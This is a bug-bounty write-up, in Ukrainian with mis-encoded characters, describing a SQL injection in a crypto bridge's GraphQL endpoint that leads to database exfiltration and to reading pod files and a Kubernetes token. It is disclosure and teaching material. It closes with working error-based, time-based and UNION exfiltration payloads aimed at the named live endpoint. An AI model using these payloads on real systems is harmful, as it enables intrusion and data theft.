# GraphQL SQL Injection => Database Exfiltration => Kubernetes Pod File Access

> –Ü—Å—Ç–æ—Ä—ñ—è –ø—Ä–æ —Ç–µ, —á–æ–º—É **GraphQL –Ω–µ –¥–æ—Ä—ñ–≤–Ω—é—î –±–µ–∑–ø–µ–∫–∞**,  
> —ñ —á–æ–º—É **–Ω–µ –º–æ–∂–Ω–∞ –¥–æ–≤—ñ—Ä—è—Ç–∏ –∑–∞–ø–∏—Ç–∞–º, —è–∫—ñ –≤—ñ–Ω –±—É–¥—É—î**.

---

## TL;DR

- GraphQL endpoint —É Web3 crypto bridge
- SQL Injection —É –ø–∞—Ä–∞–º–µ—Ç—Ä—ñ `channelId`
- PostgreSQL, raw SQL concatenation
- Blind + In-band SQLi —á–µ—Ä–µ–∑ numeric response
- Exfiltration —á–µ—Ä–µ–∑ ASCII-based technique
- Read-access –¥–æ production DB
- Superuser —É PostgreSQL ‚Üí file read
- –û—Ç—Ä–∏–º–∞–Ω–∏–π Kubernetes ServiceAccount token
- Severity –∑ –±–æ–∫—É –≤–µ–Ω–¥–æ—Ä–∞: **Low**
- –†–µ–∞–ª—å–Ω–∏–π –≤–ø–ª–∏–≤: **Critical**

---

## –ö–æ–Ω—Ç–µ–∫—Å—Ç

GraphQL ‚Äî —Ç–µ—Ö–Ω–æ–ª–æ–≥—ñ—è, –ø—Ä–∏–¥—É–º–∞–Ω–∞ —É Facebook, —è–∫–∞ –¥–æ–∑–≤–æ–ª—è—î –∫–ª—ñ—î–Ω—Ç—É –æ—Ç—Ä–∏–º—É–≤–∞—Ç–∏ –¥–∞–Ω—ñ –∑ –∫—ñ–ª—å–∫–æ—Ö —Ç–∞–±–ª–∏—Ü—å **–æ–¥–Ω–∏–º –∑–∞–ø–∏—Ç–æ–º**, –∑–∞–º—ñ—Å—Ç—å –∫–∞—Å–∫–∞–¥—É REST-–∑–∞–ø–∏—Ç—ñ–≤.

–¶–µ –∑—Ä—É—á–Ω–æ —ñ —à–≤–∏–¥–∫–æ. –ê–ª–µ...—Ü–µ –Ω–µ –ø–∞–Ω–∞—Ü–µ—è.

–£ 2025 —Ä–æ—Ü—ñ SQL Injection –∑–≤—É—á–∏—Ç—å —è–∫ —â–æ—Å—å —ñ–∑ –∫—É—Ä—Å—ñ–≤ –ø–µ–Ω—Ç–µ—Å—Ç–µ—Ä–∞-–ø–æ—á–∞—Ç–∫—ñ–≤—Ü—è, –∞–ª–µ **—ñ–Ω º—î–∫—Ü—ñ—ó –Ω–µ –∑–Ω–∏–∫–ª–∏** ‚Äî –≤–æ–Ω–∏ –ø—Ä–æ—Å—Ç–æ –∑–º—ñ—Å—Ç–∏–ª–∏—Å—è —Ç—É–¥–∏, –¥–µ —ó—Ö *–º–µ–Ω—à–µ –æ—á—ñ–∫—É—é—Ç—å*.

---

## –¶—ñ–ª—å

[Snowbridge](https://www.snowbridge.network) ‚Äî —Å–µ—Ä–≤—ñ—Å, —è–∫–∏–π –¥–æ–∑–≤–æ–ª—è—î:
- –æ–±–º—ñ–Ω—é–≤–∞—Ç–∏ **Ethereum <=> Polkadot**
- –≤—ñ–¥–æ–±—Ä–∞–∂–∞—Ç–∏ **–æ–Ω—á–µ–π–Ω-—ñ—Å—Ç–æ—Ä—ñ—é —Ç—Ä–∞–Ω–∑–∞–∫—Ü—ñ–π** –Ω–∞ –≥–æ–ª–æ–≤–Ω–æ–º—É —Å–∞–π—Ç—ñ

–¢–∏–ø–æ–≤–∏–π use case:
> ‚Äú–ü–æ–∫–∞–∂–∏ –º–µ–Ω—ñ, —â–æ –≤—ñ–¥–±—É–≤–∞—î—Ç—å—Å—è –∑–∞—Ä–∞–∑ —ñ–∑ —Ç—Ä–∞–Ω–∑–∞–∫—Ü—ñ—è–º–∏‚Äù.

---

## –ü–æ—á–∞—Ç–æ–∫ –¥–æ—Å–ª—ñ–¥–∂–µ–Ω–Ω—è

–û–¥–Ω–æ–≥–æ –≤–µ—á–æ—Ä–∞, –∑–∞–ø—É—Å—Ç–∏–≤—à–∏ **Burp Suite** —Ç–∞ –≤–≤—ñ–º–∫–Ω—É–≤—à–∏ **Interceptor**,  
—è –∑–≤–µ—Ä–Ω—É–≤—Å—è –¥–æ —Ñ—É–Ω–∫—Ü—ñ—ó –ø–µ—Ä–µ–≥–ª—è–¥—É —ñ—Å—Ç–æ—Ä—ñ—ó —Ç—Ä–∞–Ω–∑–∞–∫—Ü—ñ–π.

–£ –º–µ—Ä–µ–∂–µ–≤–æ–º—É —Ç—Ä–∞—Ñ—ñ–∫—É –∑ º—è–≤–∏–≤—Å—è **POST-–∑–∞–ø–∏—Ç**, —è–∫–∏–π –≤–∏–≥–ª—è–¥–∞–≤ —è–∫ GraphQL.

### –í–∏—è–≤–ª–µ–Ω–∏–π –º–µ—Ç–æ–¥

```graphql
toEthereumElapse(lastest, channelId)
````
–û—Å–æ–±–ª–∏–≤—É —É–≤–∞–≥—É –∑–≤–µ—Ä–Ω—É–≤ –Ω–∞ —Å–µ–±–µ –ø–∞—Ä–∞–º–µ—Ç—Ä:
```graphql
channelId
````

–¶–µ —ñ –±—É–ª–∞ –º–æ—è —Ç–æ—á–∫–∞ –≤—Ö–æ–¥—É...entry point...kipppunkt. –ö–æ—Ä–æ—Ç—à–µ, –Ω–∞–∑–∏–≤–∞–π—Ç–µ —è–∫ —Ö–æ—á–µ—Ç–µ :)

## –ü–µ—Ä—à–∏–π —Ç–µ—Å—Ç: —á–∏ –∂–∏–≤–∏–π SQL?

–Ø —Å—Ñ–æ—Ä–º—É–≤–∞–≤ –≤–ª–∞—Å–Ω–∏–π GraphQL-–∑–∞–ø–∏—Ç —ñ –ø–µ—Ä–µ–¥–∞–≤ —É `channelId` **–æ–¥–∏–Ω–∞—Ä–Ω—É –ª–∞–ø–∫—É (`'`)**.

### –û—á—ñ–∫—É–≤–∞–Ω–Ω—è

–Ø–∫—â–æ –ø–∞—Ä–∞–º–µ—Ç—Ä –±–µ–∑ —Å–∞–Ω—ñ—Ç–∏–∑–∞—Ü—ñ—ó –ø–æ—Ç—Ä–∞–ø–ª—è—î –≤ SQL ‚Äî PostgreSQL –∑—á–∏—Ç–∞—î `'` —è–∫ **—Å–∏–Ω—Ç–∞–∫—Å–∏—á–Ω—É –ø–æ–º–∏–ª–∫—É**.

–¢–∞–∫–∏–º —á–∏–Ω–æ–º, —è –æ—Ç—Ä–∏–º–∞–≤:

- `Internal Server Error`
- –ø–æ–≤–Ω–∏–π —Å—Ç–µ–∫ –ø–æ–º–∏–ª–∫–∏
- —Ç–∏–ø –ø–æ–º–∏–ª–∫–∏ PostgreSQL
- —ñ –≥–æ–ª–æ–≤–Ω–µ ‚Äî **–ø–æ–≤–Ω–∏–π SQL-–∑–∞–ø–∏—Ç**, —è–∫–∏–π GraphQL –∑–≥–µ–Ω–µ—Ä—É–≤–∞–≤ –¥–ª—è –ë–î

üé£ **HURAAAA! –†–∏–±–∫–∞ –Ω–∞ –≥–∞—á–∫—É.**

---

### Screenshot 1 ‚Äî SQL syntax error

<img width="1841" height="856" alt="image" src="https://github.com/user-attachments/assets/c4487810-b33b-45fa-a1a3-34d5d95ac6bc" />

---

## –©–æ —Ç—É—Ç –≤–∞–∂–ª–∏–≤–æ

–ü—Ä–æ–∞–Ω–∞–ª—ñ–∑—É–≤–∞–≤—à–∏ SQL-–∑–∞–ø–∏—Ç, —Å—Ç–∞–ª–æ –∑—Ä–æ–∑—É–º—ñ–ª–æ:

- —Ä–µ–∑—É–ª—å—Ç–∞—Ç –∑–∞–ø–∏—Ç—É **–∑–∞–≤–∂–¥–∏ `int`**
- API –ø–æ–≤–µ—Ä—Ç–∞—î **–æ–¥–Ω–µ —á–∏—Å–ª–æ**

**–¢—É—Ç –ø–æ—Å—Ç–∞–ª–æ –ª–æ–≥—ñ—á–Ω–µ –ø–∏—Ç–∞–Ω–Ω—è: —è–∫—â–æ –± –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫ –∑–Ω–∞–π—à–æ–≤ —Ü—é –¥—ñ—Ä—É**:

> —è–∫ –≤—ñ–Ω –≤–∏—Ç—è–≥—É–≤–∞–≤ –±–∏ –¥–∞–Ω—ñ –∑ –ë–î, –∫–æ–ª–∏ —Ç–∞ –≤—ñ–¥–ø–æ–≤—ñ–¥–∞—î —Ç—ñ–ª—å–∫–∏ —á–∏—Å–ª–æ–º ‚ùì

---

## –í—ñ–¥–ø–æ–≤—ñ–¥—å —Ä–æ–¥–∏–ª–∞ –º–æ—è —Å–∫—Ä–æ–Ω—è: Exfiltration —á–µ—Ä–µ–∑ ASCII

–ú–∏ –∑–Ω–∞—î–º–æ:

- –°–£–ë–î - **PostgreSQL**
- –£ PostgreSQL —î —Ñ—É–Ω–∫—Ü—ñ—ó:
  - `ascii()`
  - `substr()`
  - `make_interval()`

### –Ü–¥–µ—è —Ç–∞–∫–∞

1. –ë–µ—Ä–µ–º–æ –±—É–¥—å-—è–∫–∏–π —Ä—è–¥–æ–∫ (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥, `current_database()`)
2. –í–∏—Ç—è–≥—É—î–º–æ **–æ–¥–∏–Ω —Å–∏–º–≤–æ–ª**
3. –ü–µ—Ä–µ—Ç–≤–æ—Ä—é—î–º–æ –π–æ–≥–æ –≤ **ASCII-–∫–æ–¥**
4. –ü–æ–≤–µ—Ä—Ç–∞—î–º–æ —Ü–µ —á–∏—Å–ª–æ —á–µ—Ä–µ–∑ –ø–æ–ª–µ `elapse`

## –ü—Ä–∏–∫–ª–∞–¥ payload

```graphql
{
  toEthereumElapse(
    lastest: 1,
    channelId: "x' UNION SELECT now(), now() + make_interval(secs => ascii(substr((select current_database())::text,1,1)))--"
  ) {
    elapse
  }
}
```

## –í—ñ–¥–ø–æ–≤—ñ–¥—å API:

```graphql
{
  "data": {
    "toEthereumElapse": {
      "elapse": 49
    }
  }
}

```

---

### Screenshot 2 ‚Äî ASCII exfiltration

<img width="1394" height="404" alt="image" src="https://github.com/user-attachments/assets/5f72291b-f5c3-433d-9f99-48f4a70dd069" />

---

## –©–æ –≤–¥–∞–ª–æ—Å—è –æ—Ç—Ä–∏–º–∞—Ç–∏

–ß–µ—Ä–µ–∑ —Ü—é —Ç–µ—Ö–Ω—ñ–∫—É —è –≤–∏—Ç—è–≥–Ω—É–≤:

- —ñ–º º—è **production –ë–î**
- –≤–µ—Ä—Å—ñ—é **PostgreSQL**
- —Å–ø–∏—Å–æ–∫ —Ç–∞–±–ª–∏—Ü—å
- –±—ñ–∑–Ω–µ—Å-–¥–∞–Ω—ñ –∑ —Ç–∞–±–ª–∏—Ü—å —Ç—Ä–∞–Ω–∑–∞–∫—Ü—ñ–π:
  - `tx_hash`
  - `amount`
  - `timestamps`

–á—Ö —Ä–µ–∞–ª—å–Ω–∏–π –≤–∏–≥–ª—è–¥:

````
message id:    0x9c79abfbf12fc31e096ca1384038889e72f07c02497396364fd922609bf5c829
channel id:    0xc173fac324158e77fb5840738a1a541f633cbec8884c6a601c567d2b376a0539
tx hash:       0x73952d04cee93117705844cdcf33bf9f47c989e69bac520bd83b9851801a1dfe
inbound ts:    2025-09-15 17:04:47+00
status ts:     2025-09-15 16:08:00+00
````

–ß–∞—Å—Ç–∏–Ω—É –¥–∞–Ω–∏—Ö —è **–≤–µ—Ä–∏—Ñ—ñ–∫—É–≤–∞–≤ —á–µ—Ä–µ–∑ Polkadot blockchain explorer** - —Ç—Ä–∞–Ω–∑–∞–∫—Ü—ñ—ó –±—É–ª–∏ **—Ä–µ–∞–ª—å–Ω–∏–º–∏ —Ç–∞ –∞–∫—Ç—É–∞–ª—å–Ω–∏–º–∏**.

---

### Screenshot 3 ‚Äî Verification via blockchain data

<img width="1252" height="829" alt="image" src="https://github.com/user-attachments/assets/b8bf0cad-d97c-4130-afc4-f598c1ef4f50" />

---

## –ü–æ–¥–∞—á–∞ —Ä–µ–ø–æ—Ä—Ç—É —ñ —Ä–µ–∞–ª—å–Ω—ñ—Å—Ç—å bug bounty

–Ø, –∑–≤—ñ—Å–Ω–æ, –Ω–∞—Ñ–∞–Ω—Ç–∞–∑—É–≤–∞–≤ –º–∞—à–∏–Ω—É, –¥–≤–∞ –∫–≤–∏—Ç–∫–∏ –≤ –ü–∞—Ä–∏–∂ —ñ —Ç–æ–Ω–∫–æ –Ω–∞—Ä—ñ–∑–∞–Ω–∏–π –¥–æ—Ä–±–ª—é –±—ñ–ª—è –ï–π—Ñ–µ–ª–µ–≤–æ—ó –≤–µ–∂—ñ, –±–æ:

> **Critical = up to $2000**

–ê–ª–µ –ø—ñ—Å–ª—è –¥–æ–≤–≥–æ–≥–æ —Ç—Ä—ñ–∞–∂—É —ñ –¥–∏—Å–∫—É—Å—ñ–π –º—ñ–∂ –º–Ω–æ—é —Ç–∞ —Ç—Ä—ñ–∞–∂–µ—Ä–∞–º–∏, —Ç—Ä—ñ–∞–∂–µ—Ä–∞–º–∏ —ñ –≤–µ–Ω–¥–æ—Ä–æ–º...

### –í–µ—Ä–¥–∏–∫—Ç –≤–µ–Ω–¥–æ—Ä–∞

**Severity: Low**, —Ç–æ–º—É —â–æ:

- –±–∞–∑–∞ –≤ AWS
- —ñ–Ω—Å—Ç–∞–Ω—Å –∞–≤—Ç–æ–º–∞—Ç–∏—á–Ω–æ –≤—ñ–¥–Ω–æ–≤–∏—Ç—å—Å—è
- –¥–∞–Ω—ñ –ø—É–±–ª—ñ—á–Ω—ñ (–æ–Ω—á–µ–π–Ω)

### –§—ñ–Ω–∞–ª –±—É–≤ —Ç–∞–∫–∏–π

- `$200`
- –µ–∫–≤—ñ–≤–∞–ª–µ–Ω—Ç–Ω–æ: —Ä–∏–±–∫–∞ + –ø–∏–≤–æ –Ω–∞ –º—ñ—Å—è—Ü—å
- –ø–æ–≤–Ω—ñ —à—Ç–∞–Ω–∏ –¥–æ—Å–≤—ñ–¥—É

---

## –ê–ª–µ —î –Ω—é–∞–Ω—Å‚Ä¶

–ú—ñ–π PostgreSQL-–∫–æ—Ä–∏—Å—Ç—É–≤–∞—á –º–∞–≤ **SUPERUSER**.

–ê —Ü–µ –æ–∑–Ω–∞—á–∞—î:

- –¥–æ—Å—Ç—É–ø –¥–æ `pg_read_file()`
- –¥–æ—Å—Ç—É–ø –¥–æ —Ñ–∞–π–ª–æ–≤–æ—ó —Å–∏—Å—Ç–µ–º–∏ pod º–∞

### –©–æ –±—É–ª–æ –ø—Ä–æ—á–∏—Ç–∞–Ω–æ

```text
/etc/passwd
/etc/hosts
pg_hba.conf
/etc/os-release
Kubernetes ServiceAccount token
```

–∞–ª–µ –Ω–∞–≤—ñ—Ç—å —Ü–µ –Ω–µ —Å–ø–æ–∫—É—Å–∏–ª–æ –≤–µ–Ω–¥–æ—Ä–∞, —Ç–æ–º—É —â–æ...–¥–∞–Ω—ñ –æ–Ω—á–µ–π–Ω ü•∞

---

## –ê –Ω–∞ —Ü—ñ–π –Ω–æ—Ç—ñ, —è –± —Ö–æ—Ç—ñ–≤ –ø–æ–¥—ñ–ª–∏—Ç–∏—Å—å —ñ–∑ –í–∞–º–∏ –ø–µ–π–ª–æ–∞–¥–∞–º–∏, —è–∫–∏–º–∏ —è –∫–æ—Ä–∏—Å—Ç—É–≤–∞–≤—Å—è –≤ –ø—Ä–æ–¥–æ–≤–∂ —É—Å—å–æ–≥–æ —Ü—å–æ–≥–æ –¥–æ—Å–ª—ñ–¥–∂–µ–Ω–Ω—è.

1. **Error-based payloads**
```graphql
{"query":"{ toEthereumElapse(lastest: 1, channelId:\"test'abc\") { elapse } }"}
```

> –©–æ —Ä–æ–±–∏—Ç—å:
> –ü—Ä–æ–≤–æ–∫—É—î SQL syntax error —à–ª—è—Ö–æ–º —ñ–Ω º—î–∫—Ü—ñ—ó –æ–¥–∏–Ω–∞—Ä–Ω–æ—ó –ª–∞–ø–∫–∏.
> –í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –¥–ª—è –ø—ñ–¥—Ç–≤–µ—Ä–¥–∂–µ–Ω–Ω—è —Ñ–∞–∫—Ç—É SQL Injection —Ç–∞ –≤–∏—Ç–æ–∫—É stack trace.

```graphql
{"query":"{ toEthereumElapse(lastest: 1, channelId:\"test123'+'abc\") { __typename } }"}
```

> –©–æ —Ä–æ–±–∏—Ç—å:
> –ü–µ—Ä–µ–≤—ñ—Ä—è—î SQL expression evaluation —Ç–∞ –∫–æ–Ω–∫–∞—Ç–µ–Ω–∞—Ü—ñ—é —Ä—è–¥–∫—ñ–≤ —É –±–µ–∫–µ–Ω–¥—ñ.

2. **Time-based payload**

```graphql
{"query":"{ toEthereumElapse(lastest: 1, channelId:\"x'||pg_sleep(5)||'y'--\") { __typename } }"}
```

> –©–æ —Ä–æ–±–∏—Ç—å:
> –í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î pg_sleep(5) –¥–ª—è time-based SQL Injection,
> –ø—ñ–¥—Ç–≤–µ—Ä–¥–∂—É—é—á–∏ –º–æ–∂–ª–∏–≤—ñ—Å—Ç—å –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –¥–æ–≤—ñ–ª—å–Ω–∏—Ö SQL-—Ñ—É–Ω–∫—Ü—ñ–π —Ç–∞ DoS-–≤–ø–ª–∏–≤.

3. **In-band exfiltration payloads**

```graphql
{"query":"{ toEthereumElapse(lastest: 1, channelId:\"x' UNION SELECT now(), now() + make_interval(secs => ascii(substr((select current_database())::text,1,1)))--\") { elapse } }"}
```

> –©–æ —Ä–æ–±–∏—Ç—å:
> –í–∏—Ç—è–≥—É—î –ø–µ—Ä—à–∏–π —Å–∏–º–≤–æ–ª —ñ–º–µ–Ω—ñ –ë–î, –ø–µ—Ä–µ—Ç–≤–æ—Ä—é—î –π–æ–≥–æ –≤ ASCII-–∫–æ–¥
> —ñ –ø–æ–≤–µ—Ä—Ç–∞—î —á–µ—Ä–µ–∑ —á–∏—Å–ª–æ–≤–µ –ø–æ–ª–µ elapse.

```graphql
{"query":"{ toEthereumElapse(lastest: 1, channelId:\"x' UNION SELECT now(), now() + make_interval(secs => ascii(substr((select version())::text,1,1)))--\") { elapse } }"}
```

> –©–æ —Ä–æ–±–∏—Ç—å:
> –í–∏—Ç—è–≥—É—î –≤–µ—Ä—Å—ñ—é PostgreSQL —á–µ—Ä–µ–∑ ASCII-–µ–∫–æ–¥—É–≤–∞–Ω–Ω—è
> —Ç–∞ –ø—ñ–¥—Ç–≤–µ—Ä–¥–∂—É—î –ø–æ–≤–Ω–∏–π arbitrary SELECT capability.
